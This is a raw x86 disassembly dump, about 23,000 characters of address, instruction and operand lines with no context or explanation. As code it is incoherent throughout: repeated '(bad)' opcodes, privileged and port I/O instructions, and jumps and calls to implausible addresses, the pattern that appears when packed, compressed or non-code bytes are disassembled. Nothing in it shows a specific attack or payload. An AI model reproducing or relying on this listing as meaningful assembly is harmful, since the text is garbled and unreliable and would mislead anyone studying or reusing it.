  428f10:	mov    esi,DWORD PTR [edx]
  428f12:	in     al,dx
  428f13:	push   esi
  428f14:	xor    BYTE PTR [ebp-0xe],dh
  428f17:	add    edi,esi
  428f19:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  428f1f:	add    cl,bh
  428f21:	mov    edi,DWORD PTR [ebp+0x8]
  428f24:	mov    DWORD PTR [ebp-0x14],esi
  428f27:	add    esi,DWORD PTR [ebp+0x3c]
  428f2a:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  428f30:	mov    ah,0x3d
  428f32:	cwde   
  428f33:	pushf  
  428f34:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  428f3a:	jne    0x428ec7
  428f3c:	mov    ecx,DWORD PTR [esp+ebp*8]
  428f3f:	icebp  
  428f40:	icebp  
  428f41:	shl    edx,0xf2
  428f44:	(bad)  
  428f45:	mov    ah,0x16
  428f47:	cmp    BYTE PTR [ebp-0x6d],dh
  428f4a:	mov    ecx,DWORD PTR [edi]
  428f4c:	in     al,dx
  428f4d:	jmp    0x428f40
  428f4f:	add    dl,dh
  428f51:	mov    edi,esi
  428f53:	or     al,0x8
  428f55:	inc    ebp
  428f56:	jne    0x428f5b
  428f58:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  428f5e:	ret    
  428f5f:	or     bh,bh
  428f61:	jge    0x428f4b
  428f63:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  428f69:	xor    edi,eax
  428f6b:	add    esi,DWORD PTR [ebp-0x77]
  428f6e:	mov    ebx,esp
  428f70:	clc    
  428f71:	neg    DWORD PTR [ebp-0x7c]
  428f74:	xor    eax,DWORD PTR [eax]
  428f76:	cmp    eax,DWORD PTR [eax]
  428f78:	repz jne 0x428f10
  428f7b:	xor    eax,DWORD PTR [ecx]
  428f7d:	add    ebx,DWORD PTR [eax]
  428f7f:	mov    DWORD PTR [ebp-0x8],eax
  428f82:	mov    eax,edi
  428f84:	cld    
  428f85:	lock pop eax
  428f87:	test   DWORD PTR [ebx],esi
  428f89:	clc    
  428f8a:	add    edx,DWORD PTR [edi-0x740bff77]
  428f90:	fdivp  st(4),st
  428f92:	test   ecx,esi
  428f94:	(bad)  
  428f95:	jnp    0x428f96
  428f97:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  428f9d:	jae    0x428f2a
  428f9f:	sub    edi,esp
  428fa1:	(bad)  
  428fa2:	shl    DWORD PTR [eax-0x3e],0x89
  428fa6:	leave  
  428fa7:	call   0x819846b4
  428fac:	in     al,dx
  428fad:	(bad)  
  428fae:	in     al,dx
  428faf:	add    bh,al
  428fb1:	mov    esp,edi
  428fb3:	in     al,dx
  428fb4:	test   DWORD PTR [ebp-0x8],edi
  428fb7:	mov    eax,DWORD PTR [ebp+0x2b]
  428fba:	cmp    DWORD PTR [ebx],eax
  428fbc:	pushf  
  428fbd:	jnp    0x57318bf6
  428fc3:	xor    edx,DWORD PTR [eax-0x77]
  428fc6:	push   ecx
  428fc7:	loopne 0x428ffc
  428fc9:	jne    0x428f86
  428fcb:	mov    esi,DWORD PTR [edx-0x20]
  428fce:	add    BYTE PTR [ebp-0x3d],bh
  428fd1:	xor    eax,DWORD PTR [ebp-0x73]
  428fd4:	mov    edi,DWORD PTR [esi]
  428fd6:	cld    
  428fd7:	jb     0x428f9f
  428fd9:	add    bl,al
  428fdb:	jne    0x429022
  428fdd:	mov    edx,DWORD PTR [edi-0x10]
  428fe0:	jge    0x42905f
  428fe2:	mov    esi,DWORD PTR [ebx]
  428fe4:	lock add ecx,DWORD PTR [ebp+0x3b]
  428fe8:	xor    esi,DWORD PTR [ebp-0x77]
  428feb:	mov    esi,eax
  428fed:	lock inc ebp
  428fef:	jge    0x429029
  428ff1:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  428ff8:	dec    ebp
  428ff9:	mov    esi,DWORD PTR [ebx]
  428ffb:	loopne 0x428f86
  428ffd:	jge    0x428ff7
  428fff:	add    DWORD PTR [ebp-0x7d],eax
  429002:	clc    
  429003:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  42900a:	dec    ebp
  42900b:	hlt    
  42900c:	xor    ebx,DWORD PTR [ebp-0x77]
  42900f:	mov    esi,esp
  429011:	in     al,0x45
  429013:	jge    0x429051
  429015:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  42901c:	dec    ebp
  42901d:	cmp    al,0x33
  42901f:	xchg   ebx,eax
  429020:	mov    DWORD PTR [ebx-0x14],esi
  429023:	add    eax,DWORD PTR [ebp-0xc]
  429026:	cmp    BYTE PTR [ebp-0x61],dh
  429029:	mov    edi,DWORD PTR [eax+0xf19504]
  42902f:	repnz mov DWORD PTR [ebp+0x20],ebx
  429033:	cmp    eax,DWORD PTR [ebp+0xf]
  429036:	test   DWORD PTR [edi+ecx*1-0x1],edx
  42903a:	fistp  WORD PTR [ebx+0x0]
  42903d:	inc    ebp
  42903e:	mov    ebx,DWORD PTR [edi+0xc]
  429041:	add    eax,eax
  429043:	inc    ebp
  429044:	test   BYTE PTR [ebx],dh
  429046:	add    eax,DWORD PTR [ebx]
  429048:	add    BYTE PTR [esi+0x45],bl
  42904b:	ret    0x85
  42904e:	jnp    0x5443141d
  429054:	inc    bp
  429056:	inc    ebp
  429057:	cmp    BYTE PTR [ecx+0xc78a9c],bh
  42905d:	fdiv   QWORD PTR [ebx]
  42905f:	test   DWORD PTR [ecx+0x453af8],edi
  429065:	push   ebx
  429066:	add    edi,DWORD PTR [esi+0x708088b]
  42906c:	cmp    esi,eax
  42906e:	sets   BYTE PTR [ecx-0x74fcffce]
  429075:	mov    esp,edi
  429077:	call   0x33cdd5c9
  42907c:	or     BYTE PTR [ebx],al
  42907e:	inc    ecx
  42907f:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  429085:	and    BYTE PTR [ebp-0x7074f0bb],al
  42908b:	lock add cl,al
  42908e:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  429095:	mov    ch,0x45
  429097:	clc    
  429098:	xor    eax,DWORD PTR [ebp+0x3]
  42909b:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4290a1:	inc    ebp
  4290a2:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4290a8:	mov    edi,eax
  4290aa:	mov    eax,DWORD PTR [ebp+0x3c]
  4290ad:	mov    ecx,DWORD PTR [eax]
  4290af:	hlt    
  4290b0:	inc    ebp
  4290b1:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4290b8:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4290be:	push   ebp
  4290bf:	mov    edi,DWORD PTR [ebx]
  4290c1:	in     al,dx
  4290c2:	jne    0x429085
  4290c4:	mov    eax,DWORD PTR [ebp-0x28]
  4290c7:	add    DWORD PTR [eax],0xe8058dec
  4290cd:	clc    
  4290ce:	mov    esp,DWORD PTR [edi-0x8]
  4290d1:	add    dh,dl
  4290d3:	rol    WORD PTR [ebp-0x1],cl
  4290d7:	mov    edx,DWORD PTR [eax+0x8]
  4290da:	jne    0x42909c
  4290dc:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  4290e3:	inc    ebp
  4290e4:	push   esp
  4290e5:	test   DWORD PTR [ecx+0xf],ecx
  4290e8:	sub    edx,esp
  4290ea:	add    eax,DWORD PTR [eax]
  4290ec:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4290f2:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  4290f9:	mov    eax,DWORD PTR [ecx]
  4290fb:	and    BYTE PTR [eax],al
  4290fd:	adc    BYTE PTR ss:[eax],al
  429100:	inc    ebp
  429101:	inc    cx
  429104:	push   esp
  429105:	cld    
  429106:	jne    0x429108
  429108:	push   edx
  429109:	enterw 0xc1,0x4d
  42910e:	mov    esp,DWORD PTR [esi+0x20]
  429111:	add    DWORD PTR [ecx-0x7b],eax
  429114:	add    eax,DWORD PTR [ebx]
  429116:	str    WORD PTR [eax+0x45]
  42911a:	lea    ecx,[ebx+0x45890801]
  429120:	sbb    BYTE PTR [ebx],al
  429122:	dec    ebp
  429123:	cmp    al,0xf
  429125:	inc    ebp
  429126:	push   eax
  429127:	mov    esi,DWORD PTR [ebx]
  429129:	push   eax
  42912a:	add    eax,eax
  42912c:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  429133:	inc    ebp
  429134:	add    BYTE PTR [eax],bh
  429136:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  42913d:	(bad)  
  42913e:	mov    ebx,eax
  429140:	loopne 0x429187
  429142:	dec    ebp
  429143:	mov    ecx,DWORD PTR [edi]
  429145:	cld    
  429146:	push   eax
  429147:	xchg   DWORD PTR [ebx],esi
  429149:	add    DWORD PTR [ebx],ebp
  42914b:	add    BYTE PTR [ebx],ch
  42914d:	or     BYTE PTR [ecx],bh
  42914f:	dec    ecx
  429150:	loopne 0x429155
  429152:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  429158:	push   ebp
  429159:	add    DWORD PTR [ebx+0x55100800],eax
  42915f:	dec    ebp
  429160:	jmp    0x4290eb
  429162:	mov    esp,DWORD PTR [eax]
  429164:	sbb    dl,dl
  429166:	inc    eax
  429167:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  42916d:	add    BYTE PTR [ebx+0x74528555],cl
  429173:	push   ebp
  429174:	div    DWORD PTR [ebx]
  429176:	and    eax,DWORD PTR [ebx]
  429178:	add    edx,DWORD PTR [edx-0x30]
  42917b:	jno    0x429108
  42917d:	inc    DWORD PTR [eax+eiz*1]
  429180:	inc    ebp
  429181:	push   eax
  429182:	push   eax
  429183:	mov    esp,DWORD PTR [edi-0x74beff1c]
  429189:	mov    edi,esp
  42918b:	push   eax
  42918c:	inc    ebp
  42918d:	enter  0x458b,0x8
  429191:	push   ecx
  429192:	(bad)  
  429193:	call   0x10c9b6b
  429198:	pop    ss
  429199:	push   ebp
  42919a:	mov    ecx,DWORD PTR [ebx+0x489408]
  4291a0:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4291a6:	push   ecx
  4291a7:	jo     0x429191
  4291a9:	inc    DWORD PTR [edi]
  4291ab:	or     BYTE PTR [eax],al
  4291ad:	call   0xcd98f7
  4291b2:	fmul   QWORD PTR [ebp+0x55]
  4291b5:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4291bb:	mov    bh,0x8c
  4291bd:	adc    al,0x98
  4291bf:	dec    esp
  4291c0:	xor    bl,BYTE PTR [eax]
  4291c2:	mov    ecx,DWORD PTR [ebp+0xc]
  4291c5:	mov    eax,DWORD PTR [ebp-0x4]
  4291c8:	mov    esi,DWORD PTR [edi-0x3148f924]
  4291ce:	push   es
  4291cf:	retf   
  4291d0:	mov    BYTE PTR [ebp-0x30],0x3b
  4291d4:	inc    ebp
  4291d5:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4291dc:	retf   0x83fc
  4291df:	into   
  4291e0:	dec    ebp
  4291e1:	retf   
  4291e2:	mov    ecx,DWORD PTR [ebp-0x74]
  4291e5:	mov    eax,DWORD PTR [eax]
  4291e7:	fdiv   QWORD PTR [ebx]
  4291e9:	mov    bh,0x3
  4291eb:	push   es
  4291ec:	mov    esi,ecx
  4291ee:	sbb    cl,dl
  4291f0:	dec    ebp
  4291f1:	sar    DWORD PTR [ebx],cl
  4291f3:	push   ebp
  4291f4:	jne    0x429205
  4291f6:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4291fc:	lea    ebx,[eax]
  4291fe:	call   0xf4cc1dc5
  429203:	sbb    dh,dl
  429205:	add    edx,ebx
  429207:	push   ebp
  429208:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  42920e:	push   ecx
  42920f:	mov    DWORD PTR [eax-0x30],edx
  429212:	test   DWORD PTR [edx],eax
  429214:	xadd   esp,esi
  429217:	pop    es
  429218:	add    cl,dl
  42921a:	mov    eax,ecx
  42921c:	or     al,0x45
  42921e:	(bad)  
  42921f:	push   eax
  429220:	add    DWORD PTR [edx+0x0],eax
  429223:	add    ecx,DWORD PTR [ecx]
  429225:	and    dh,cl
  429227:	call   0xc69af7
  42922c:	add    DWORD PTR [ebp+0x0],edx
  42922f:	mov    esp,DWORD PTR [ebp+0x18]
  429232:	add    BYTE PTR [eax+0x44],cl
  429235:	xor    eax,DWORD PTR [eax]
  429237:	add    esp,DWORD PTR [esi+0x3b]
  42923a:	inc    ebp
  42923b:	je     0x4291c0
  42923d:	push   ecx
  42923e:	or     cl,BYTE PTR [ebp-0x77]
  429241:	add    eax,esi
  429243:	or     al,0x5e
  429245:	inc    eax
  429246:	add    BYTE PTR [ebx],al
  429248:	data16 and BYTE PTR [ebp+0x50],al
  42924c:	sub    DWORD PTR [ecx],0xffffffe8
  42924f:	add    BYTE PTR [ebp-0x75],ah
  429252:	add    BYTE PTR [eax],bl
  429254:	enter  0x894d,0x8b
  429258:	int3   
  429259:	loopne 0x42928d
  42925b:	rol    BYTE PTR [eax],0x33
  42925e:	lea    cx,[ebp+0xa]
  429262:	data16 jb 0x4292aa
  429265:	add    BYTE PTR [ebx+0x44890855],cl
  42926b:	sbb    ah,al
  42926d:	inc    ebp
  42926e:	lldt   WORD PTR ss:[edx+0x66]
  429273:	xor    ecx,DWORD PTR [eax]
  429275:	sub    edi,esp
  429277:	mov    eax,DWORD PTR [eax]
  429279:	or     al,0x66
  42927b:	ror    edx,cl
  42927d:	dec    ebp
  42927e:	inc    ebp
  42927f:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  429285:	cld    
  429286:	or     BYTE PTR [edi+0x4501dd],dl
  42928c:	(bad)  
  42928d:	into   
  42928e:	out    dx,al
  42928f:	retf   
  429290:	(bad)  
  429291:	dec    ebp
  429292:	mov    al,0x8b
  429294:	jmp    0xea27:0x450ac320
  42929b:	xchg   esi,ebp
  42929d:	add    edi,eax
  42929f:	add    BYTE PTR [eax+0x3f52e955],bh
  4292a5:	push   ebp
  4292a6:	inc    ebp
  4292a7:	xor    ebx,esp
  4292a9:	add    ebp,esi
  4292ab:	push   edx
  4292ac:	push   bp
  4292ae:	inc    ebp
  4292af:	(bad)  
  4292b0:	in     eax,dx
  4292b1:	push   esp
  4292b2:	(bad)  
  4292b3:	inc    edx
  4292b5:	sbb    al,0x33
  4292b7:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4292be:	add    BYTE PTR [ebp+0x43],0x8b
  4292c2:	jmp    0xf98b:0x100041c8
  4292c9:	xor    esi,DWORD PTR [edx+0x3]
  4292cc:	mov    ecx,DWORD PTR [edi]
  4292ce:	fmul   DWORD PTR [edx]
  4292d0:	add    BYTE PTR [eax],al
  4292d2:	lea    eax,[ebx-0x4700273c]
  4292d8:	add    al,0x4f
  4292da:	pop    DWORD PTR [eax]
  4292dc:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4292e2:	push   edx
  4292e3:	inc    WORD PTR [ebp+0x8]
  4292e7:	mov    eax,0x514f4d
  4292ec:	(bad)
  4292f0:	add    al,al
  4292f2:	xor    DWORD PTR [ebx-0x74baf730],eax
  4292f8:	test   DWORD PTR [esi+0x74],esp
  4292fb:	inc    ebp
  4292fc:	mov    DWORD PTR [eax+0xa4f08],edi
  429302:	add    BYTE PTR [ecx-0x76c435bb],cl
  429308:	or     dh,cl
  42930a:	or     eax,0x8b8d5045
  42930f:	inc    ebp
  429310:	mov    WORD PTR [ecx+0x3b8a00],?
  429316:	jne    0x42934b
  429318:	mov    edi,DWORD PTR [edx+0x8f3a18]
  42931e:	add    DWORD PTR [ebx],eax
  429320:	add    bh,bh
  429322:	adc    DWORD PTR [eax],ecx
  429324:	adc    DWORD PTR [ebp+0x55],edi
  429327:	push   es
  429328:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  42932e:	mov    ebp,DWORD PTR [eax+ebp*1+0x50c211dc]
  429335:	inc    ebp
  429336:	mov    esp,edi
  429338:	or     al,0xdc
  42933a:	push   eax
  42933b:	(bad)  
  42933c:	jne    0x4292f2
  42933e:	call   0x3a8c2f
  429343:	inc    ebp
  429344:	rol    dl,0x84
  429347:	out    dx,al
  429348:	add    bh,al
  42934a:	add    BYTE PTR [ebp+esi*2-0x1c7424],bh
  429351:	(bad)  
  429352:	and    al,al
  429354:	fs in  eax,dx
  429356:	inc    DWORD PTR [ebp-0x7b]
  429359:	js     0x42936a
  42935b:	leave  
  42935c:	scas   al,BYTE PTR es:[edi]
  42935d:	inc    esp
  42935e:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  429365:	or     BYTE PTR [ebx-0x97717c5],0x83
  42936c:	call   DWORD PTR [edi]
  42936e:	shr    ah,0x84
  429371:	xchg   DWORD PTR [eax],eax
  429373:	add    DWORD PTR [eax],eax
  429375:	add    bh,bh
  429377:	dec    ebp
  429378:	and    BYTE PTR [ecx-0x38],dl
  42937b:	push   eax
  42937c:	dec    DWORD PTR [ebx+0xfd885]
  429382:	mov    BYTE PTR [ebp+0x508bac00],cl
  429388:	mov    WORD PTR [ecx+0x0],ss
  42938b:	lea    ecx,[ebx+0x108b20d8]
  429391:	mov    WORD PTR [edx],ds
  429393:	add    BYTE PTR [edi+0xff01ff],al
  429399:	mov    ecx,DWORD PTR [ebp-0x28]
  42939c:	push   ecx
  42939d:	shl    BYTE PTR [ebp+0x3a],0x8b
  4293a1:	inc    ebp
  4293a2:	in     al,0xeb
  4293a4:	jno    0x429331
  4293a6:	push   edx
  4293a7:	mov    DWORD PTR [eax-0x28],edx
  4293aa:	mov    eax,DWORD PTR [ebp+0x20]
  4293ad:	je     0x429336
  4293af:	mov    eax,DWORD PTR [ecx]
  4293b1:	sbb    BYTE PTR [eax],al
  4293b3:	pop    DWORD PTR [eax]
  4293b5:	add    esi,eax
  4293b7:	add    bl,al
  4293b9:	adc    DWORD PTR [edi],esi
  4293bb:	jmp    0x8bcde40d
  4293c0:	sub    BYTE PTR [ebp+eax*2-0x63c4c800],cl
  4293c7:	jne    0x429354
  4293c9:	mov    ecx,DWORD PTR [eax]
  4293cb:	in     al,0x75
  4293cd:	pop    DWORD PTR [ecx+0x5001]
  4293d3:	push   edx
  4293d4:	inc    DWORD PTR [ebx]
  4293d6:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4293dc:	add    BYTE PTR [edi+0x9],dl
  4293df:	call   DWORD PTR [esi]
  4293e1:	and    dl,al
  4293e3:	and    bh,bh
  4293e5:	inc    edi
  4293e7:	test   eax,edx
  4293e9:	sldt   ebx
  4293ec:	cmp    DWORD PTR [eax],eax
  4293ee:	pushf  
  4293ef:	(bad)  
  4293f0:	jmp    0x4293fe
  4293f2:	mov    eax,edi
  4293f4:	or     al,0x75
  4293f6:	inc    eax
  4293f7:	call   0x428aff
  4293fc:	mov    eax,eax
  4293fe:	loopne 0x429384
  429400:	inc    ebp
  429401:	add    BYTE PTR [ebx+0x1451c00],cl
  429407:	mov    eax,DWORD PTR [ebp+0x20]
  42940a:	add    edi,ecx
  42940c:	add    BYTE PTR [eax],ch
  42940e:	cmp    edi,0x18
  429411:	test   DWORD PTR [ebp+0xf],esi
  429414:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  42941b:	jne    0x42941f
  42941d:	call   0xffa18ee2
  429422:	leave  
  429423:	rcr    BYTE PTR [esp+eax*4],0x55
  429427:	add    ah,ch
  429429:	add    BYTE PTR [edi-0x48fef979],dh
  42942f:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  429436:	inc    esp
  429437:	mov    ebx,DWORD PTR [eax]
  429439:	fcom   st(2)
  42943b:	add    BYTE PTR [edi],bl
  42943d:	lea    ecx,[eax-0x18]
  429440:	(bad)  
  429441:	push   DWORD PTR [ecx]
  429443:	call   0xffb4e1a5
  429448:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  42944c:	fstp   DWORD PTR [esi+ebx*8]
  42944f:	push   ebp
  429450:	pop    ebp
  429451:	mov    esi,DWORD PTR [edx-0x38]
  429454:	add    DWORD PTR [eax],0x28
  429457:	mov    edi,DWORD PTR [ebx]
  429459:	xor    esi,DWORD PTR [edx+0x3]
  42945c:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  429460:	pop    ebp
  429461:	or     al,0x4
  429463:	inc    ecx
  429464:	push   ebp
  429465:	(bad)  
  429466:	in     al,dx
  429467:	or     ah,ch
  429469:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42946a:	xbegin 0xffc80a60
  429470:	clc    
  429471:	adc    al,0x45
  429473:	idiv   BYTE PTR [ecx]
  429475:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  42947c:	test   DWORD PTR [eax+0x665300f8],ebx
  429482:	add    BYTE PTR [ecx+0x66],dh
  429485:	add    eax,DWORD PTR [ebp+0x52]
  429488:	adc    eax,0x20
  42948b:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  429491:	test   DWORD PTR [eax],eax
  429493:	clc    
  429494:	data16 or al,BYTE PTR [ebp+0x45]
  429498:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  42949f:	rol    BYTE PTR [ebp+0x45],1
  4294a2:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4294a8:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4294ae:	push   ebx
  4294af:	add    BYTE PTR [eax+0x0],dl
  4294b2:	push   ecx
  4294b3:	jge    0x4294e8
  4294b5:	add    BYTE PTR [esi+0x4],dl
  4294b8:	jne    0x42951f
  4294ba:	mov    edx,0x457200
  4294bf:	jmp    0x429483
  4294c1:	xor    edi,DWORD PTR [ebx]
  4294c3:	pop    edi
  4294c4:	cvtdq2ps xmm7,xmm0
  4294c7:	ret    0x0
  4294ca:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4294d0:	xor    ecx,DWORD PTR [edi]
  4294d2:	add    eax,DWORD PTR [ecx+0x3b]
  4294d5:	push   ebx
  4294d6:	rdpmc  
  4294d8:	out    0x8d,al
  4294da:	add    BYTE PTR [eax],cl
  4294dc:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4294e2:	ret    0x450c
  4294e5:	sbb    al,0x8b
  4294e7:	cmp    eax,esi
  4294e9:	or     cl,al
  4294eb:	or     al,0xc2
  4294ed:	pop    eax
  4294ee:	inc    ebp
  4294ef:	add    ecx,DWORD PTR [edi]
  4294f1:	add    esi,DWORD PTR [ebp+0x39]
  4294f4:	invd   
  4294f6:	jge    0x429502
  4294f8:	mov    eax,0x478ac0
  4294fd:	cli    
  4294fe:	xor    esp,ecx
  429500:	mov    ebx,0x5b8ac0
  429505:	ret    0x33
  429508:	mov    eax,0x833a8b
  42950d:	sub    BYTE PTR [ebx],al
  42950f:	inc    ebp
  429510:	data16 cmp al,bh
  429513:	pushf  
  429514:	inc    bh
  429516:	mov    esp,esp
  429518:	hlt    
  429519:	test   DWORD PTR [ebp-0x8],esi
  42951c:	mov    eax,DWORD PTR [ebp-0x14]
  42951f:	cmp    cl,BYTE PTR [ebx-0x76478864]
  429525:	dec    edi
  429526:	or     BYTE PTR [eax],al
  429528:	jne    0x4294b3
  42952a:	mov    esi,esp
  42952c:	call   0x77a920f1
  429531:	inc    ebp
  429532:	mov    DWORD PTR [eax+0x984f0c],edi
  429538:	add    BYTE PTR [ecx-0x3ffe0717],cl
  42953e:	add    BYTE PTR [esi+0x7d],ah
  429541:	inc    ebp
  429542:	mov    bx,WORD PTR [ebp+0x8]
  429546:	add    DWORD PTR [ebp+0x50],0x30c008b
  42954d:	inc    ebp
  42954e:	mov    bx,di
  429551:	lock test BYTE PTR [ecx+0x7000801],bh
  429558:	jge    0x42951b
  42955a:	mov    ecx,DWORD PTR [ebx-0x670613f0]
  429560:	cli    
  429561:	xor    bl,bh
  429563:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  429569:	test   BYTE PTR [eax],cl
  42956b:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  429572:	cmp    ebp,eax
  429574:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  42957b:	test   BYTE PTR [ebp+0x1],bh
  42957e:	mov    ebx,0x458a00
  429583:	xor    esi,DWORD PTR [ebx]
  429585:	add    esp,DWORD PTR [esi-0x77]
  429588:	pop    ebp
  429589:	loopne 0x4295f1
  42958b:	inc    ebp
  42958c:	clc    
  42958d:	xor    edi,DWORD PTR [ebx]
  42958f:	add    esi,DWORD PTR [edx-0x77]
  429592:	data16 fdivr QWORD PTR [ebp-0x49]
  429596:	mov    ebx,0xb78afc
  42959b:	hlt    
  42959c:	xor    esi,DWORD PTR [esi]
  42959e:	data16 add BYTE PTR [ebp+0x66],bl
  4295a2:	data16 lock clc 
  4295a5:	cmp    eax,DWORD PTR ss:[eax]
  4295a8:	ja     0x429610
  4295aa:	psubq  mm7,QWORD PTR [ebp-0x4]
  4295ae:	ltr    WORD PTR [ebp+0x66]
  4295b2:	add    esi,eax
  4295b4:	add    di,WORD PTR [ebp+0x2b]
  4295b8:	data16 data16 jge 0x429639
  4295bc:	mov    ebx,0xe08a8b
  4295c1:	jge    0x4295f6
  4295c3:	data16 data16 xor al,0x5d
  4295c7:	data16 data16 jne 0x4295c3
  4295cb:	mov    edi,DWORD PTR [ebx]
  4295cd:	fdiv   QWORD PTR [edx+0x7d]
  4295d0:	data16 data16 jge 0x429608
  4295d4:	mov    ebx,0x758a66
  4295d9:	mov    esi,0x667233
  4295de:	pop    ebp
  4295df:	or     BYTE PTR [esi+0x0],ah
  4295e2:	clc    
  4295e3:	mov    edi,DWORD PTR [ebx]
  4295e5:	lock ja 0x429573
  4295e8:	(bad)  
  4295ea:	jge    0x4295e3
  4295ec:	invd   
  4295ee:	pop    ebp
  4295ef:	add    BYTE PTR [ebx],al
  4295f1:	(bad)  
  4295f2:	cmp    di,WORD PTR [ebp+0xf]
  4295f6:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4295fa:	mov    bx,WORD PTR [ebp-0x10]
  4295fe:	pop    bp
  429600:	fbstp  TBYTE PTR [ebx]
  429602:	test   DWORD PTR [ebx],eax
  429604:	add    BYTE PTR [ebx],bh
  429606:	add    BYTE PTR [esi+0x7d],ah
  429609:	jge    0x429596
  42960b:	data16 in al,dx
  42960d:	pop    ebp
  42960e:	stc    
  42960f:	bsf    ecx,DWORD PTR [ebp+0x66320098]
  429616:	mov    edi,ebx
  429618:	in     al,dx
  429619:	test   BYTE PTR [ebp+0x0],bh
  42961c:	mov    eax,DWORD PTR [eax]
  42961e:	call   0xbd3f8fae
  429623:	ss cwde 
  429625:	add    BYTE PTR [edx],dh
  429627:	mov    bx,di
  42962a:	call   0x8b4b13ba
  42962f:	add    ebp,esp
  429631:	mov    bx,di
  429634:	jnp    0x42965c
  429636:	mov    DWORD PTR [ebx+0x367df808],ecx
  42963c:	mov    eax,DWORD PTR [eax]
  42963e:	call   0x7c3e21a9
  429643:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  429649:	data16 data16 fistp WORD PTR [ebp+0xe]
  42964e:	xor    DWORD PTR [edi-0x48fff7b0],0xfb66f403
  429658:	fisttp WORD PTR [ecx-0x7401f77b]
  42965e:	(bad)  
  42965f:	cld    
  429660:	jne    0x429698
  429662:	xor    eax,DWORD PTR [eax]
  429664:	mov    esp,DWORD PTR [esi-0x10]
  429667:	sti    
  429668:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  42966f:	data16 adc bl,bh
  429672:	push   ebp
  429673:	xor    ecx,DWORD PTR es:[ebx+0x36e4f88b]
  42967a:	mov    WORD PTR [eax],es
  42967c:	cwde   
  42967d:	data16 xor bh,bl
  429680:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  429686:	mov    esp,DWORD PTR [esi-0x14]
  429689:	fisttp WORD PTR [ebx-0x3748a9f2]
  42968f:	or     al,0x2b
  429691:	mov    bh,0xba
  429693:	hlt    
  429694:	mov    bh,bl
  429696:	add    BYTE PTR [ecx-0x7446f3cd],cl
  42969c:	dec    edi
  42969d:	or     al,0x0
  42969f:	mov    edi,DWORD PTR [ebx]
  4296a1:	or     BYTE PTR [ebp+0x3b],dh
  4296a4:	mov    ecx,DWORD PTR [edi]
  4296a6:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4296ac:	xor    al,0xd8
  4296ae:	pop    bp
  4296b0:	lock xor esi,DWORD PTR [ebx]
  4296b3:	lea    esp,[esi+0x1f]
  4296b6:	icebp  
  4296b7:	jb     0x4296bd
  4296b9:	add    al,al
  4296bb:	jge    0x4296c9
  4296bd:	mov    eax,eax
  4296bf:	fsubr  st,st(3)
  4296c1:	pop    ebp
  4296c2:	mov    esi,DWORD PTR [ebx]
  4296c4:	in     al,0x8d
  4296c6:	rcr    DWORD PTR [edi],0xc2
  4296c9:	jb     0x429729
  4296cb:	add    cl,cl
  4296cd:	jge    0x4296db
  4296cf:	mov    edx,DWORD PTR [ebp-0x20]
  4296d2:	in     al,dx
  4296d3:	pop    ebp
  4296d4:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4296d9:	data16 cmp bh,BYTE PTR [ebp+0x0]
  4296dd:	mov    ebp,DWORD PTR [ebx]
  4296df:	fdivr  QWORD PTR [esi+0x668a5d]
  4296e5:	cmp    al,0x33
  4296e7:	mov    si,0x4f7d
  4296eb:	mov    eax,DWORD PTR [eax]
  4296ed:	lock inc ebp
  4296ef:	mov    esi,DWORD PTR [edi]
  4296f1:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4296f8:	clc    
  4296f9:	(bad)  
  4296fa:	cmp    edi,DWORD PTR [ebx]
  4296fc:	je     0x42970d
  4296fe:	push   ebx
  4296ff:	loopne 0x429710
  429701:	dec    ecx
  429703:	mov    ebp,DWORD PTR [eax-0x1c]
  429706:	int    0xf1
  429708:	mov    esi,0x703084d
